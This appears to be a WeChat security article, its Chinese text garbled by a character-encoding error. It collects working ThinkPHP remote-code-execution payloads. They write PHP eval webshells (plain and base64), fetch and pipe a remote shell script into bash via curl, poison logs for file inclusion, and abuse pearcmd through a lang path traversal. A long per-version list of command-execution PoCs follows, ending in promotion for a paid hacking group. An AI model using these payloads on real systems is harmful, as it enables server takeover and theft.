![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3emAvuq2DdEW8Q9Yp2GZ6bqicqDmYbxn3US35RtLxncDaqibMN6cvQ8viaQ/640?wx_fmt=png "")  
  
okçŸ¥é“äº†,å°±å†™  
/var/www/public/è¿™é‡Œ  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echoÂ <?phpÂ @eval($_POST['milu']);Â ?>Â Â >>/var/www/public/milu.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3exGkASGDhfJDeomFiaZfbqTO7Eg7nZSsnmEwwCGLazxtdy15AkzibfblA/640?wx_fmt=png "")  
# å¦‚æœå†™å…¥å¤±è´¥,base64ä¸€ä¸‹  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echoIDw/cGhwIEBldmFsKCRfUE9TVFsnbWlsdSddKTsgPz4= >>/var/www/public/hushell.php
```  
  
èšğŸ—¡è¿æ¥å°±è¡Œäº†,å¯†ç æ˜¯milu  
# åå¼¹shell  
# å¼€å¯web  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eacxicMyJ1TFib7pRndSS8liaqOOib0F4I8OkxDLSKEIGnhlIjuk6jiaLiaBA/640?wx_fmt=png "")  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl http://192.168.233.131/shell.sh | bash
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eEGRXWTVxI5HZPl9biap4c3ia1n5zvyPNdjAXUzFchDqIgiaGLrt50rDmg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eWc2WsFkOALIiaLq6YXkvwxdpjexiaR9cLliat3CP6SHrIK1cXjW2faWPA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eXAonsZVIKPzko5nkCNouHr186mPh3nqZib2o73RZLxibvdHOmgUdEibKA/640?wx_fmt=png "")  
##   
## ä¸Šé¢æœ‰ä¸ª5rce,ç°åœ¨æ˜¯5.0.23,å¯èƒ½æœ‰è¯»è€…ä¸æ‡‚äº†,éº‹é¹¿æ¥è§£é‡Šä¸€ä¸‹  
## tpÂ 5ç‰ˆæœ¬rceæœ‰ä¸¤ä¸ªç‰ˆæœ¬  
  
ThinkPHP 5.0-5.0.24å’ŒThinkPHP 5.1.0-5.1.30  
  
æ¼æ´è§¦å‘ç‚¹å’Œç‰ˆæœ¬çš„ä¸åŒï¼Œæ‰€ä»¥payloadä¹Ÿä¸ä¸€æ ·,æ¡ä»¶ä¹Ÿä¸ä¸€æ ·  
  
<table><thead><tr><th style="padding: 8px 14px;background-color: rgb(250, 250, 250);border-top-width: 1px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">ç‰ˆæœ¬å</th><th style="padding: 8px 14px;background-color: rgb(250, 250, 250);border-top-width: 1px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯å¦å¯è¢«æ”»å‡»</th><th style="padding: 8px 14px;background-color: rgb(250, 250, 250);border-top-width: 1px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;word-break: break-all;"><p><span style="font-size: var(--articleFontsize);letter-spacing: 0.034em;">æ”»å‡»æ¡ä»¶</span><br/></p></th></tr></thead><tbody><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.0</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.1</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.2</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.3</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.4</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.5</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.6</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.7</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.8</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.9</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.10</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.11</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.12</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.13</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.14</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.15</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.16</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.17</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.18</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.19</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.20</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">å¦</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ— </td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.21</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.22</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.23</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">æ˜¯</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">éœ€å¼€å¯debug</td></tr></tbody></table>  
5.0.13~5.0.19é»˜è®¤æƒ…å†µä¸‹configä¸­çš„app_debugé…ç½®é¡¹ä¸ºfalseï¼Œå¤ç°çš„æ—¶å€™éœ€è¦å¼€å¯è¿™ä¸ª  
  
æ€»ç»“ä¸€ä¸‹  
  
5.1.x ï¼š  
```
?s=index/thinkRequest/input&filter[]=system&data=pwd?s=index/thinkviewdriverPhp/display&content=<?php phpinfo();?>?s=index/thinktemplatedriverfile/write&cacheFile=shell.php&content=<?php phpinfo();?>?s=index/thinkContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```  
  
5.0.x ï¼š  
```
?s=index/thinkconfig/get&name=database.username # è·å–é…ç½®ä¿¡æ¯?s=index/thinkLang/load&file=../../test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶?s=index/thinkConfig/load&file=../../t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id?s=index|thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
```  
  
5.0  
.13  
```
http://php.local/thinkphp5.0.5/public/index.php?s=indexpost_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo_method=__construct&filter[]=system&method=GET&get[]=whoami# ThinkPHP <= 5.0.13POST /?s=index/indexs=whoami&_method=__construct&method=&filter[]=system# ThinkPHP <= 5.0.23ã€5.1.0 <= 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debugPOST /_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al# ThinkPHP <= 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captchaPOST /?s=xxx HTTP/1.1_method=__construct&filter[]=system&method=get&get[]=ls+-al_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```  
  
  
**ThinkPHP3.2.x RCE**  
# 1.æ¼æ´ä»‹ç»  
  
ThinkPHP3.2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´äº§ç”ŸåŸå› æ˜¯ç”±äºåœ¨ä¸šåŠ¡ä»£ç ä¸­å¦‚æœå¯¹æ¨¡æ¿èµ‹å€¼æ–¹æ³•assignçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œåˆ™å¯¼è‡´æ¨¡æ¿è·¯å¾„å˜é‡è¢«è¦†ç›–ä¸ºæºå¸¦æ”»å‡»ä»£ç è·¯å¾„ï¼Œé€ æˆæ–‡ä»¶åŒ…å«ï¼Œä»£ç æ‰§è¡Œç­‰å±å®³ã€‚  
  
**2.ç‰ˆæœ¬**  
  
3.2.x  
  
**3.å¤ç°**  
  
å…ˆåˆ›å»ºä¸€ä¸ªæ—¥å¿—,å¹¶å†™å…¥phpinfo  
  
index.php?m=--><?=phpinfo();?>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3enezUe1uaHyNicU49emhPtiaDmnZesibhuGfVSkSD2vlgXQyqViccsWXeKQ/640?wx_fmt=png "")  
  
ç„¶åå»åŒ…å«è¿™ä¸ªæ–‡ä»¶,æ–‡ä»¶åå°±æ˜¯ä»Šå¤©çš„æ—¥æœŸ  
```
index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_10_19.log
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eBwbbAriaAg7HD70hkgn0kpbpC06CvsSdXsEBfEROJbkJ8bpHNceG76w/640?wx_fmt=png "")  
# ä¸åŒç‰ˆæœ¬æ—¥å¿—ä½ç½®ä¸ä¸€æ ·,çœ‹æˆ‘æ€»ç»“  
# Â Â Â Â   
```
THINKPHP3.2 ç»“æ„ï¼š
Application\Runtime\Logs\Home\æ—¥æœŸ.log
THINKPHP3.1ç»“æ„ï¼š
Runtime\Logs\Home\æ—¥æœŸ.log
æ—¥å¿—å­˜å‚¨ç»“æ„æ˜¯ ï¼šé¡¹ç›®å\Runtime\Logs\Home\å¹´ä»½_æœˆä»½_æ—¥æœŸ.log
```  
# thinkphp lang å‘½ä»¤æ‰§è¡Œ  
  
  
**1 æ¼æ´åŸç†**  
  
åœ¨å…¶6.0.13ç‰ˆæœ¬åŠä»¥å‰ï¼Œå­˜åœ¨ä¸€å¤„æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚å½“å¤šè¯­è¨€ç‰¹æ€§è¢«å¼€å¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨langå‚æ•°æ¥åŒ…å«ä»»æ„PHPæ–‡ä»¶ã€‚  
  
è™½ç„¶åªèƒ½åŒ…å«æœ¬åœ°PHPæ–‡ä»¶ï¼Œä½†åœ¨å¼€å¯äº†register_argc_argvä¸”å®‰è£…äº†pcel/pearçš„ç¯å¢ƒä¸‹ï¼Œå¯ä»¥åŒ…å«/usr/local/lib/php/pearcmd.phpå¹¶å†™å…¥ä»»æ„æ–‡ä»¶  
  
è®¿é—®è·¯å¾„è¯¶ï¼š/public/index.php  
  
**2 å½±å“ç‰ˆæœ¬**  
  
6.0.1 < ThinkPHPâ‰¤ 6.0.13  
  
5.0.0 < ThinkPHPâ‰¤ 5.0.12  
  
5.1.0 < ThinkPHPâ‰¤ 5.1.8  
  
**3 å‰ç½®çŸ¥è¯†**  
  
1.HTMLä¹‹langå±æ€§ï¼šåœ¨Htmlå…¨å±€å±æ€§åˆ—è¡¨ä¸­ï¼Œå¯¹langå±æ€§çš„æè¿°ä¸ºï¼ˆDefines the language used in the element - å®šä¹‰å…ƒç´ ä¸­ä½¿ç”¨çš„è¯­è¨€ï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œlangå±æ€§çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å®šä¹‰å…ƒç´ ä¸­ä½¿ç”¨çš„è¯­è¨€ã€‚  
  
2.PEAR:PEARä¹Ÿå°±æ˜¯ä¸ºPHPæ‰©å±•ä¸åº”ç”¨åº“(PHP Extension and Application Repository)ï¼Œå®ƒæ˜¯ä¸€ä¸ªPHPæ‰©å±•åŠåº”ç”¨çš„ä¸€ä¸ªä»£ç ä»“åº“ã€‚  
  
3.Pearcmdï¼špearcmd.phpæ˜¯pearå·¥å…·è°ƒç”¨çš„åŠŸèƒ½æ–‡ä»¶ï¼Œpearæ˜¯ç®¡ç†phpçš„æ‰©å±•ç®¡ç†å·¥å…·ï¼Œ å¯ä»¥ç†è§£ä¸ºphpçš„å‘½ä»¤è¡Œå·¥å…·ã€‚  
  
4.config-createï¼šåˆ›å»ºæ–‡ä»¶ï¼Œè¯¥æ–¹æ³•éœ€æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å†™å…¥æ–‡ä»¶çš„å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥æ–‡ä»¶çš„è·¯å¾„  
  
**4 å¤ç°**  
  
è®¿é—®  
public/index.phpå¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„tpç‰¹å¾  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCO8vfYS9f5nw8Cmkq63fIichFj9wuHQ5eCia04LR9Vl2ibWEEGJ6ibP0BWYw/640?wx_fmt=png "")  
  
getè®¿é—®  
```
?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['milu']);?>+/var/www/html/milu.php
```  
  
è§£é‡Šä¸€ä¸‹  
payload  
  
å°±æ˜¯åˆ©ç”¨ç›®å½•éå†åˆ°pearcmd,ç„¶å  
é€šè¿‡ pearcmd æ–‡ä»¶åŒ…å«è¿™ä¸ªtrickå»æ‰§è¡Œåˆ›å»º/var/www/html/milu.phpæ–‡ä»¶å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬,å¯†ç ä¸ºmilu  
  
ç„¶åè®¿é—®milu.phpå°±è¡Œäº†  
  
**ä¸€äº›æŒ‡çº¹å·¥å…·å’Œç½‘ç«™**  
  
TideFinger æ½®æ±æŒ‡çº¹ TideFinger æ½®æ±æŒ‡çº¹ (tidesec.com)  
  
https://github.com/anx0ing/thinkphp_scan  
  
https://github.com/sukabuliet/ThinkphpRCE  
  
https://github.com/bewhale/thinkphp_gui_tools  
  
https://github.com/Lotus6/ThinkphpGUI(æ— 2ç‰ˆæœ¬æ£€æµ‹åŠŸèƒ½)  
  
**æœ€åæ€»ç»“ä¸ªå„ç‰ˆæœ¬çš„pocå§**  
  
2.x  
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```  
  
3.2.3  
```
index.php?m=--><?=phpinfo();?>
index.php?m=Home&c=Index&a=index&value[_filename]=.\Application\Runtime\Logs\Common\æ—¥æœŸ.log
```  
  
5.0.x  
```
?s=index/think\config/get&name=database.username // è·å–é…ç½®ä¿¡æ¯
?s=index/\think\Lang/load&file=../../test.jpg // åŒ…å«ä»»æ„æ–‡ä»¶
?s=index/\think\Config/load&file=../../t.php // åŒ…å«ä»»æ„.phpæ–‡ä»¶
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
call_user_func ä¸å¤§è¡Œ..
?s=index/\think\app/invokefunction?function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\View/display&content=phpinfo();?>
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1
s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=2
s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=...
```  
  
5.0.7  
```
aa=file_put_contents('test.php'%2C'%3C%3Fphp+phpinfo()%3B')&_method=__construct&method=POST&filter[]=assert
```  
  
5.0 - 5.0.22  
```
index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1]
[]=-1%20and%20it%27ll%20execute%20the%20phpinfo
```  
  
Â 5.0.23  
```
 ThinkPHP <= 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&.=ls
```  
  
Â   
  
5.1.x  
```
?s=index/\think\Request/input&filter[]=system&data=pwd 
?s=index/\think\view\driver\Php/display&content= 
s=index/\think\template\driver\file/write&cacheFile=shell.php&content= 
s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\request/input?data[]=-1&filter=phpinfo
?s=index/think\app/invokefunction?function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index|think\app/invokefunction&function=call_user_func&vars[0]=phpinfo&vars[1]=1
?s=index/think\request/input?data[]=-1&filter=phpinfo
?s=index/think\app/invokefunction&function=call_user_func&vars[0]=md5&vars[1]=123456
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\View/display&content=
?s=index/think\View/display&content=
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 
s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=whoami
?s=index/\think\app/invokefunction&function=call_user_func&vars[0]=system&vars[1]=powershell%20ls
chdir
```  
  
  
  
**â˜…**  
  
**ä»˜è´¹åœˆå­**  
  
  
**æ¬¢Â è¿ åŠ Â å…¥Â æ˜Ÿ çƒ ï¼**  
  
**ä»£ç å®¡è®¡+å…æ€+æ¸—é€å­¦ä¹ èµ„æº+å„ç§èµ„æ–™æ–‡æ¡£+å„ç§å·¥å…·+ä»˜è´¹ä¼šå‘˜**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**è¿›æˆå‘˜å†…éƒ¨ç¾¤**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**æ˜Ÿçƒçš„æœ€è¿‘ä¸»é¢˜å’Œæ˜Ÿçƒå†…éƒ¨å·¥å…·ä¸€äº›å±•ç¤º******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8CKksEIzZyEb3tEFGzGYSXfribrG4jKOkRKGKYb7zk7MTNZPT6Wp3bLd2BPhuFHddIL6sqrg1d2qHQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8D0bS8ibc3XhFcDYkVusFvc3c6onthQpPGZn4v32rpOp7CeFiamGdeC7JBk0mGVsiciazLp3z0SIJAtnQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**åŠ å…¥å®‰å…¨äº¤æµç¾¤**  
  
  

								[ Â  Â  Â  Â  Â  Â  Â  Â ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			 Â  Â  Â  Â  Â  Â  Â  Â   
  
  
**å…³ æ³¨ æœ‰ ç¤¼**  
  
  
  
å…³æ³¨ä¸‹æ–¹å…¬ä¼—å·å›å¤â€œ  
666  
